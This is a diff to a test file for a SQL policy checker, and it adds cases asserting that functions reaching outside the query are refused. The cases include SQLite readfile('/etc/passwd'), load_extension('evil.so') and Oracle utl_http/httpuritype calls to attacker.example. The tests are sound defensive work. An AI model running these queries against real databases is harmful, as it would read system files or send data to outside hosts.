@@ -126,10 +126,24 @@ def test_matching_is_case_insensitive() -> None:
         ("select sleep(30) from marts.a", "mysql"),
         ("select getenv('HOME') from marts.a", "duckdb"),
         ("select nextval('marts.seq') from marts.a", "postgres"),
+        ("select readfile('/etc/passwd') from marts.a", "sqlite"),
+        ("select writefile('/tmp/x', 'data') from marts.a", "sqlite"),
+        ("select load_extension('evil.so') from marts.a", "sqlite"),
+        ("select * from marts.a, fsdir('/home') d", "sqlite"),
+        ("select utl_http.request('http://attacker.example') from marts.a", "oracle"),
+        ("select sys.utl_file.fopen('DIR', 'f.txt', 'r') from marts.a", "oracle"),
+        ("select dbms_xmlgen.getxml('select 1 from dual') from marts.a", "oracle"),
+        ("select httpuritype('http://attacker.example').getclob() from marts.a", "oracle"),
     ],
 )
 def test_functions_that_reach_outside_the_query_are_refused(sql: str, dialect: str) -> None:
     assert refusal(sql, Policy.of(["marts.*"], dialect=dialect)) is Rule.FUNCTION
+
+
+def test_ordinary_package_style_calls_still_run() -> None:
+    # A schema-qualified user function is not one of the blocked packages.
+    oracle = Policy.of(["marts.*"], dialect="oracle")
+    check("select marts.fiscal_week(order_date) from marts.a", oracle)
 
 
 def test_select_into_and_locking_reads_are_refused() -> None:
